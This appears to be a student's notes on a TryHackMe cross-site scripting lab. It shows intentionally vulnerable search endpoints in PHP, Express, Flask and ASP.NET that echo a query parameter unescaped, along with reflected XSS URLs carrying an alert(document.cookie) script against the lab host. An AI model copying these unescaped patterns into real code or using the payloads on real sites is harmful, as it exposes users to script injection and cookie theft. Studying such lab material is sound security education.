---
description: https://tryhackme.com/r/room/axss
---

# 🫀 XSS Tryhackme

## Find the vulnerable code:

### PHP

```
<?php
$search_query = $_GET['q'];
echo "<p>You searched for: $search_query</p>";
?>
```

If we imagine the following url:

```
http://shop.thm/search.php?q=table
```

`$_GET['q']` has the value `table`

`We could try to alert() the cookie of the page:`

```
http://shop.thm/search.php?q=<script>alert(document.cookie)
```

### JavaScript (Node.js)

```
const express = require('express');
const app = express();

app.get('/search', function(req, res) {
    var searchTerm = req.query.q;
    res.send('You searched for: ' + searchTerm);
});

app.listen(80);
```

The `req.query.q` will extract the value of `q:`

```
http://shop.thm/search?q=table
```

It could the be exploit with the following:

```
http://shop.thm/search?q=<script>alert(document.cookie)</script>
```

### Python (Flask)

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/search")
def home():
    query = request.args.get("q")
    return f"You searched for: {query}!"

if __name__ == "__main__":
    app.run(debug=True)
```

`request.args.get()` is used to access query string parameters from the request URL so the `request.args.get("q")` would have the value table in the following url:

```
http://shop.thm/search?q=table
```

And could simply be abused like this:

```
http://shop.thm/search?q=<script>alert(document.cookie)</script>
```

### ASP.NET

Lets consider the following:

```
public void Page_Load(object sender, EventArgs e)
{
    var userInput = Request.QueryString["q"];
    Response.Write("User Input: " + userInput);
}
```

The code above uses `Request.QueryString`, which returns a collection of associated string keys and values. In the example above, we are interested in the value associated with the key `q`, and we save it in the variable `userInput`. Finally, the response is created by appending the `userInput` to another string.
